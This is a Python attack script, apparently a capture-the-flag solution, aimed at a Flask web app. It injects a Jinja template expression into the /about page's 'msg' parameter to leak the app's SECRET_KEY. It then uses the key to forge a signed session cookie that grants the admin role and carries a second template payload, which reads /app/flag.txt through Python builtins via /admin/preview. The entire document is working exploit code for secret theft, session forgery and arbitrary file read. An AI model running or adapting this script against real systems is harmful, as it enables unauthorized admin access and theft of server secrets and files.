#!/usr/bin/env python3
import argparse
import html
import re
from urllib.parse import urlparse
import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

parser = argparse.ArgumentParser()
parser.add_argument('url')
args = parser.parse_args()
base = args.url.rstrip('/')
host = urlparse(base).hostname
s = requests.Session()
r = s.get(base + '/about', params={'msg':'KEYSTART{config[SECRET_KEY]}KEYEND'}, timeout=10)
r.raise_for_status()
m = re.search(r'KEYSTART(.*?)KEYEND', html.unescape(r.text), re.S)
if not m:
    raise SystemExit('[-] SECRET_KEY not found')
secret = m.group(1).strip()
print('[+] SECRET_KEY:', secret)
app = Flask(__name__)
app.secret_key = secret
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
payload = "{{ get_flashed_messages.__globals__.__builtins__.open('/app/flag.txt').read() }}"
cookie = serializer.dumps({'username':'guest','role':'admin','draft':payload})
s.cookies.clear()
s.cookies.set('session', cookie, domain=host, path='/')
print('[+] Cookie prepared for:', host)
r = s.get(base + '/admin/preview', timeout=10, allow_redirects=False)
print('[+] Preview status:', r.status_code)
print('[+] Preview response:\n' + r.text[:4000])
